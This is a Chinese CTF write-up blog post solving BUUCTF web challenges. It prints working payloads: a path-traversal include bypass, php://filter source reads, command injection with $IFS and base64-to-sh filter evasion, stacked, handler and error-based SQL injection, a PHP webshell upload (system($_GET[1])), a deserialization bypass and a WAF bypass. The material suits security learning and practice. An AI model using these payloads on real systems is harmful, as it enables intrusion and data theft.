---
title: "BUUCTF Web Writeup 1"
date: 2022-08-21T22:04:46+08:00
lastmod: 2022-08-21T22:04:46+08:00
draft: false
author: "X1r0z"

tags: ['php', 'ctf', 'sql', 'upload']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF Web 刷题记录...

<!--more-->

## [极客大挑战 2019]EasySQL

简单注入

## [HCTF 2018]WarmUp

右键源代码, 注释里面提示 source.php

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

hint.php 内容如下

```
flag not here, and flag in ffffllllaaaagggg
```

本来想用伪协议的, 测试了发现不行, 数组也失败了, 必须得含有 source.php 或者 hint.php 关键词

想了一会, 突然发现被 checkFile 带歪了... 因为最终 include 的是 `$_REQUEST['file]` 而不是过滤之后的内容

checkFile 里操作是先 in_array() 检测, 然后去掉 `?` 后面的内容, 然后再检测一次, 然后 urldecode, 再去掉 `?` 后的内容, 再检测一次

如果 payload 是 source.php?123 的话, 最终会变成 source.php 返回 true, 之后包含 `source.php?123` 这个文件 (不存在)

因为服务器是 Linux, 访问不存在的目录时能够通过 `../` 跳出去, 于是构造 payload 如下

```
http://5f983f05-03ae-4831-8bcb-062ce604b15a.node4.buuoj.cn:81/source.php?file=source.php?/../../../../../../ffffllllaaaagggg
```

这里相当于是进了 `source.php?/` 这个不存在的文件夹, 然后不断通过 `..` 跳出去, 最终来到根目录读取 flag

有的 wp 里把 `?` 替换成 `%253f`, 原理差不多, 只是最后返回 true 的位置不一样

## [极客大挑战 2019]Havefun

右键注释

![20220820230411](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820230411.png)

传参 `?cat=dog` 提交

## [ACTF2020 新生赛]Include

简单文件包含

```
http://157345b5-8e54-4d2e-941e-6fb6b6b90f65.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

## [ACTF2020 新生赛]Exec

![20220820230738](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820230738.png)

简单命令执行

`; cat /flag`

## [强网杯 2019]随便注

![20220820231136](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820231136.png)

sqlmap 是没有灵魂的

mysql 注入

order by 列数为 3

输入 select 时返回提示信息

```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

参考文章

[https://threezh1.com/2020/12/06/Mysql8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87SELECT%E8%BF%87%E6%BB%A4](https://threezh1.com/2020/12/06/Mysql8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87SELECT%E8%BF%87%E6%BB%A4)

一些思路

1. 表内注入
2. 堆叠注入
3. handler 注入
4. load_file() 直接读文件

load_file() 测试发现不行, 表内注入目前自己还没有找到相关资料...

先试一下堆叠注入

```sql
1'; show tables #
```

![20220820232858](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820232858.png)

成功执行, 出现了 1919810931114514 这个表, 猜测 flag 应该在这里面

```sql
1'; show columns from `1919810931114514` #
```

这里的数字要加上反引号, 否则 mysql 会报错

![20220820234628](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820234628.png)

想了下 update delete drop insert 都被过滤了好像也没有什么办法 (日志文件 getshell 还没试)

后来了解了一下发现 handler 注入的前提是支持堆查询

参考文章 [https://blog.csdn.net/JesseYoung/article/details/40785137](https://blog.csdn.net/JesseYoung/article/details/40785137)

> Handler 是 Mysql 特有的轻量级查询语句, 类似于 select, 但并不具备 select 语句的所有功能.

一个使用 handler 查询的流程如下

```sql
handler tableName open;
handler tableName read first;
handler tableName read next;
...
handler tableName close;
```

payload

```sql
1'; handler `1919810931114514` open;handler `1919810931114514` read first #
```

![20220820234817](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820234817.png)

在 wp 中看到其它几种解法, 思路挺好的

> 将 words 和 1919810931114514 表互换

alter 语句介绍 [https://www.runoob.com/mysql/mysql-alter.html](https://www.runoob.com/mysql/mysql-alter.html)

```sql
alter table `words` rename to `words1`;
alter table `1919810931114514` rename to `words`;
alter table `words` change `flag` `id` varchar(100) character utf8_general_ci NOT NULL;
```

查询语句是 `select * from words where id = xx`, 如果没有 id 字段的话会报错

不确定 `character utf8_general_ci NOT NULL;` 是否必须, 本地测试发现没有这段也能运行...

之后提交 `1'or 1=1 #`, 因为 id 的内容是 flag, 查不到, 需要构造永真条件

修改表名的另一种写法

```sql
rename table A to B;
```

> 预编译 + concat 拼接

mysql 预编译的介绍 [https://www.cnblogs.com/micrari/p/7112781.html](https://www.cnblogs.com/micrari/p/7112781.html)

预编译的语句是字符串的形式, 所以可以使用 concat 等字符串操作函数进行拼接来绕过 select 的过滤

```sql
set @a = concat("sel","ect flag from `1919810931114514`");
prepare st from @a
execute st;
```

这里的语句还能用 hex 编码绕过

试了一下返回 `strstr($inject, "set") && strstr($inject, "prepare")`

不过 `strstr()` 区分大小写, 改一下就行了, sql 语句对大小写不敏感

## [SUCTF 2019]EasySQL

![20220821132122](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220821132122.png)

过滤了 union and or sleep update insert delete from handler flag

数字型注入, 支持堆查询, 但有长度限制, 最长39个字符

```sql
1;show tables;
```

![20220821132301](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220821132301.png)

查不了列名, 因为过滤了 Flag

于是决定看一下 wp...

> 这道题目需要我们去对后端语句进行猜测, 有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符, 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有 ||, 也就是 `select 输入的数据||内置的一个列名 from 表名`, 进一步进行猜测即为 `select post 进去的数据||flag from Flag` (含有数据的表名, 通过堆叠注入可知), 需要注意的是, 此时的 || 起到的作用是 or 的作用.

```php
sql = "select $_POST['query'] || flag from Flag";
```

**第一种解法: 提交 `*,1`**

看到 `||` 想到了之前命令执行的 payload

```bash
cmd1 || cmd2 # 如果 cmd1 正常执行就不会执行 cmd2
```

SQL 中逻辑运算符 `||` 的判断跟上面的一样, 如果前面的条件为 true 就不会执行后面的条件 (因为此时整个条件已经满足 true), 如果前面的条件为 false, 则会进一步判断后面的条件, 进而检查整个条件是 true 还是 false

因为直接 select 字符串不方便理解, 这里本地用 sleep 为例

```sql
mysql> select * from Flag;
+------------+
| flag       |
+------------+
| flag{test} |
+------------+
1 row in set (0.00 sec)

mysql> select 1 || sleep(1) from Flag;
+---------------+
| 1 || sleep(1) |
+---------------+
|             1 |
+---------------+
1 row in set (0.00 sec)

mysql> select 0 || sleep(1) from Flag;
+---------------+
| 0 || sleep(1) |
+---------------+
|             0 |
+---------------+
1 row in set (1.01 sec)
```

可以看到前面为 1 的时候, 因为整个条件本身已经满足 true, 所以不会执行 sleep(1), 而前面为 0 的时候, 则需要进一步确认整个条件的真假性, 所以执行了后面的 sleep(1) (返回 0 的原因是 sleep 函数没有返回值)

理解了之后再看第一种解法

```sql
select *,1 || flag from Flag;
```

把语句分开看, 逗号前面是 `*`, 而逗号后面的 `1 || flag` 是一个整体, 这个整体返回的就是 true

这就类似于平常查表的时候执行 `select name,age from students`, 通过逗号来查询多个字段

为啥是 `*,1` 而不能是 `1,*`? 后者在 mysql 里执行会报错

把语句拼接一下是下面这样

```sql
select 1,* || flag from Flag;
```

`* || flag` 本身就是个错误的写法, 通配符无法表示真假性

最后再说一下, payload 的关键点在于 `*`, 而后面的数字不影响执行的结果, 改成其它值也是可以的

**第二种解法**

```sql
1;set sql_mode=pipes_as_concat;select 1
```

这是在已经知道了 SQL 语句中含有 `||` 的前提下, 通过更改 mysql 的配置来改变 `||` 的功能

光看单词也很容易理解, 将 `||` 功能从逻辑运算符更改为拼接字符串

```sql
mysql> set sql_mode=pipes_as_concat;
Query OK, 0 rows affected (0.00 sec)

mysql> select 1||2||3||4||5;
+---------------+
| 1||2||3||4||5 |
+---------------+
| 12345         |
+---------------+
1 row in set (0.00 sec)
```

这样之后执行 `select 1 || flag from Flag` 的时候, 也会把 flag 显示出来 (拼接)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211603291.png)

## [极客大挑战 2019]Secret File

右键源代码和跳转绕了一大圈...

抓包得到地址如下

```
http://6c8f24ad-3e52-41fe-b1bb-3e938ff9eb12.node4.buuoj.cn:81/secr3t.php
```

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

文件包含

```
http://6c8f24ad-3e52-41fe-b1bb-3e938ff9eb12.node4.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

## [GXYCTF2019]Ping Ping Ping

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211612946.png)

过滤的比较多, 懒得写了...

试了一个 payload 读 index.php

```bash
127.0.0.1;cat$IFS$9index.php
```

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

刚好前几天用了下 tar... 然后空格可以用 `$IFS$9` 绕过, 并且 `.` 没有被过滤

```bash
127.0.0.1;tar$IFS$9-cf$IFS$9a.tar$IFS$9.
```

下载打开解压得到 flag

之后又想到一种方法

```bash
127.0.0.1;cat$IFS$9`ls`
```

在 wp 中看到的其它解法

```bash
127.0.0.1;a=g;cat$IFS$1fla$a.php
127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

利用变量拼接或者 base64 绕过检测

## [极客大挑战 2019]LoveSQL

简单 sql 注入

xpath 报错

```sql
123' and updatexml(1,concat(0x7e,(select password from l0ve1ysq1 where username='flag'),0x7e),1) #
```

有长度限制, 需要配合 substr

floor() + rand() 报错

```sql
123' union select count(*),2,concat(':',(select password from l0ve1ysq1 where username='flag'),':',floor(rand()*2))as a from information_schema.tables group by a #
```

这个没有长度限制

## [极客大挑战 2019]Knife

简单命令执行

## [极客大挑战 2019]Http

referer user-agent xff 头伪造

## [极客大挑战 2019]Upload

后缀为黑名单过滤, 同时检测了文件头和文件内容

文件内容不能包含 `<?`, 使用 script 标签绕过

```html
GIF89A
<script language="php">system($_GET[1]);</script>
```

改后缀为.phtml 上传

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211716151.png)

## [ACTF2020 新生赛]Upload

上传后文件自动重命名, 后缀为黑名单过滤

方法同上, 利用 phtml

## [极客大挑战 2019]BabySQL

简单 sql 注入

关键字被替换为空, 双写绕过

```sql
1' ununionion selselectect 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql #
```

## [极客大挑战 2019]PHP

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211733438.png)

下载 www.zip 打开

index.php 部分代码

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

class.php

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

反序列化

```php
<?php

class Name{
    private $username = 'admin';
    private $password = '100';
}

echo urlencode(serialize(new Name()));

?>
```

然后把属性数量改一下, 提交得到 flag

## [RoarCTF 2019]Easy Calc

右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211743852.png)

calc.php

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

提交 `scandir(current(localeconv()))` 显示 403

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211743574.png)

估计是 waf

num 参数只要输入字母就会返回 403, 组数组绕过失败... 但换成其它参数名没有被拦截

看了 wp 才知道需要利用 PHP 字符串解析的特性

参考文章 [https://www.freebuf.com/articles/web/213359.html](https://www.freebuf.com/articles/web/213359.html)

> PHP 将传入的参数解析为变量时, 会对变量名进行如下操作
>
> 1. 将非法字符转换为下划线
> 2. 去除开头的空白字符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208212103837.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208212103272.png)

其实跟之前的下划线转换原理差不多, 因为 waf 检测的是 `?num=xxx`, 我们只需要构造 `? num=xxx` (num 前有一个空格), 就能够绕过 waf

再结合一下无参数函数进行 rce

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211849490.png)

读取 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208211849221.png)

这题还有另外一种解法, **HTTP 走私攻击**

参考文章

[https://paper.seebug.org/1048/](https://paper.seebug.org/1048/)

[https://xz.aliyun.com/t/6654](https://xz.aliyun.com/t/6654) (文章里面还有上一种解法的另外一种 payload, 这里就不详细写了)

目前广为流传的一种方法是写两次 `Content-Length` 头

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208212155545.png)

爆了 400 错误, 但是后面能正常显示 phpinfo

不过总感觉不太像... 后来想想可能是因为这个

> 在 RFC7230 的第3.3.3节中的第四条中, 规定当服务器收到的请求中包含两个 `Content-Length`, 而且两者的值不同时, 需要返回400错误.

而有些服务器却不会严格的实现该规范

如果照这个方面想的话, 这个 waf 应该是一个反向代理的 waf, 通过畸形的 header 头使反代服务器爆出 400 错误, 但是真正的后端服务器因为没有严格实现规范导致可以正常接收并处理请求